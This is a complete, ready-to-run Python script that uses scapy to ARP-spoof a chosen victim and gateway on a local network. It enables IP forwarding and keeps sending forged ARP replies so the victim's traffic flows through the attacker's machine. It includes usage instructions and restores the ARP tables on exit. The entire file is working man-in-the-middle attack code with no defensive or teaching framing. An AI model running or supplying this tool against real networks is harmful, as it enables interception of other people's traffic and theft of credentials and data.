import scapy.all as scapy
import time
import os
import logging
from threading import Thread
import sys

INTERFACE = "wlan0"  # Change this to your actual interface name
INTERVAL = 2  # Time between spoof packets
LOG_FILE = "arp_spoof.log"
STOP_FILE = "/tmp/stop_spoofing"


# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

def get_mac(ip):
    print(f"[DEBUG] Looking up MAC for {ip}...")
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
    if answered:
        mac = answered[0][1].hwsrc
        print(f"[DEBUG] MAC for {ip}: {mac}")
        return mac
    print(f"[WARN] MAC not found for {ip}")
    return None

def enable_ip_forwarding():
    print("[DEBUG] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[DEBUG] IP forwarding enabled.")

def disable_ip_forwarding():
    print("[DEBUG] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[DEBUG] IP forwarding disabled.")

def spoof(target_ip, target_mac, spoof_ip):
    # print(f"[DEBUG] Spoofing {target_ip} pretending to be {spoof_ip}")
    pkt = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.sendp(pkt, iface=INTERFACE, verbose=False)
    # print(f"[INFO] Spoofed packet sent to {target_ip} (claiming to be {spoof_ip})")

def restore(target_ip, target_mac, source_ip, source_mac):
    print(f"[DEBUG] Restoring ARP table for {target_ip} (source: {source_ip})")
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=source_ip, hwsrc=source_mac
    )
    scapy.sendp(packet, count=4, iface=INTERFACE, verbose=False)
    print(f"[INFO] Sent restoration packet to {target_ip} restoring {source_ip}")

class ArpSpoofer(Thread):
    def __init__(self, victim_ip, gateway_ip):
        super().__init__()
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        print("[INFO] Resolving MAC addresses...")
        self.victim_mac = get_mac(victim_ip)
        self.gateway_mac = get_mac(gateway_ip)
        self.running = True

        if not self.victim_mac or not self.gateway_mac:
            raise Exception("[ERROR] Failed to resolve required MAC addresses.")

        print(f"[INFO] Victim MAC: {self.victim_mac}")
        print(f"[INFO] Gateway MAC: {self.gateway_mac}")

    def run(self):
        print("[INFO] Starting ARP spoofing thread...")
        enable_ip_forwarding()
        logging.info(f"ARP Spoofing started between {self.victim_ip} and {self.gateway_ip}")
        try:
            while self.running and not os.path.exists(STOP_FILE):
                spoof(self.victim_ip, self.victim_mac, self.gateway_ip)
                spoof(self.gateway_ip, self.gateway_mac, self.victim_ip)
                print(f"[DEBUG] Sent spoof packets to {self.victim_ip} and {self.gateway_ip}")
                time.sleep(INTERVAL)
        except Exception as e:
            print(f"[ERROR] Exception in spoofing loop: {e}")
        finally:
            self.stop()

    def stop(self):
        print("[INFO] Stopping ARP spoofing and restoring network...")
        self.running = False
        if os.path.exists(STOP_FILE):
            os.remove(STOP_FILE)
        restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
        restore(self.gateway_ip, self.gateway_mac, self.victim_ip, self.victim_mac)
        disable_ip_forwarding()
        logging.info("ARP tables restored. Spoofing stopped.")
        print("[INFO] ARP tables restored.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("[!] Run as root (sudo)")

    if len(sys.argv) != 3:
        print("Usage: sudo python3 arp_spoofer.py <victim_ip> <gateway_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    try:
        spoofer = ArpSpoofer(victim_ip, gateway_ip)
        spoofer.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[CTRL+C] Interrupt received. Cleaning up...")
        spoofer.stop()
        spoofer.join()
        print("[INFO] Done.")
